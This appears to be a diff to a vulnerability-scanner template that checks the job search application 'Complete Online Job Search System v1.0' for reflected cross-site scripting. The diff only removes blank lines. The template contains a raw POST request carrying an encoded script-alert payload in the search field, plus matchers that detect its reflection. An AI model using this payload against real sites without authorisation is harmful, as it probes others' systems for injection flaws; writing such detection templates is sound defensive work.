@@ -1,5 +1,4 @@
 id: eris-xss
-
 info:
   name: Complete Online Job Search System v1.0 - Reflected Cross Site Scripting
   author: arafatansari
@@ -9,7 +8,6 @@ info:
   metadata:
     verified: true
   tags: cve,cve2022,xss,eris
-
 requests:
   - raw:
       - |
@@ -18,7 +16,6 @@ requests:
         Content-Type: application/x-www-form-urlencoded
 
         SEARCH=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&COMPANY=&CATEGORY=&submit=Submit
-
     matchers-condition: and
     matchers:
       - type: word
@@ -27,12 +24,10 @@ requests:
           - 'Result : <script>alert(document.domain)</script>'
           - 'ERIS'
         condition: and
-
       - type: word
         part: header
         words:
           - text/html
-
       - type: status
         status:
           - 200
